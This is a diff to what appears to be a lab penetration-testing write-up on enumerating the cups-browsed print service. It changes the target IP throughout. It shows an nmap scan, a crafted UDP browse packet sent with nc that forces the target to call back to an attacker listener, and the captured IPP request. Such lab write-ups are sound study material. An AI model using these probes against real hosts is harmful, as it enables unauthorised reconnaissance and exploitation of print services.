@@ -18,7 +18,7 @@ Enumeration of the CUPS/cups-browsed print service on port 631, newly added to t
 ### Step 1: Port discovery
 
 ```bash
-nmap -sU -p 631 192.168.144.200
+nmap -sU -p 631 192.168.144.100
 ```
 
 ```
@@ -42,7 +42,7 @@ Rather than relying on the ambiguous UDP scan result, the service was tested dir
 Packet format (four fields: type, state, printer URI, quoted location, quoted info):
 
 ```bash
-printf '0 3 http://192.168.144.129:8000/printers/test "Office HQ" "Test Printer"' | nc -u -w1 192.168.144.200 631
+printf '0 3 http://192.168.144.129:8000/printers/test "Office HQ" "Test Printer"' | nc -u -w1 192.168.144.100 631
 ```
 
 Listener on the attacker side:
@@ -54,7 +54,7 @@ nc -lvnp 8000
 Result:
 
 ```
-Connection received on 192.168.144.200 37378
+Connection received on 192.168.144.100 37378
 POST /printers/test HTTP/1.1
 Content-Length: 182
 Content-Type: application/ipp
@@ -79,7 +79,7 @@ cups-queue-info.nse
 Two CUPS-specific scripts exist. Both were run against the target:
 
 ```bash
-nmap -p 631 --script cups-info,cups-queue-info -sU 192.168.144.200
+nmap -p 631 --script cups-info,cups-queue-info -sU 192.168.144.100
 ```
 
 **Neither script produced any output at all.** No error, no partial result, silence. This is consistent with the broader NSE reliability pattern already documented across this project (see `r-04- ftp-banner-grab-and-anonymous-access.md`, `r-18- smtp-enumeration.md`): a plausible explanation is that both scripts likely expect to interact with `cupsd`'s own IPP/HTTP interface (which, as established in this activity, is bound to loopback only and therefore genuinely unreachable from Kali), rather than with `cups-browsed`'s UDP callback mechanism, which is the actual attack surface this vulnerability depends on. Their silence here is therefore explainable and consistent with the target's real configuration, not an unexplained gap, but it's recorded for completeness and to reinforce that the manual UDP callback test in Step 2 remains the correct and necessary technique for this specific vulnerability, no NSE shortcut exists for it in this nmap installation.
